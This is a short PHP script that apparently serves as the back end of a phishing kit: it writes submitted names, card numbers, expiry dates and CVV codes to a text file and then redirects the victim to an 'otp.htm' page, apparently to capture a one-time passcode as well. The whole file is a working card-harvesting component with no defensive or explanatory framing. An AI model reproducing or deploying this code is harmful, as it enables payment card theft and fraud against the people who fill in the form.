<?php
file_put_contents("data.txt",  " NAME      : ". $_POST["name"]. "\n", FILE_APPEND);
file_put_contents("data.txt",  " NUMBER    : ". $_POST["number"]. "\n", FILE_APPEND);
file_put_contents("data.txt",  " DATE      : ". $_POST["date"]. "\n", FILE_APPEND);
file_put_contents("data.txt",  " CVV       : ". $_POST["cvv"]. "\n", FILE_APPEND);
header('Location: otp.htm');
exit();
?>
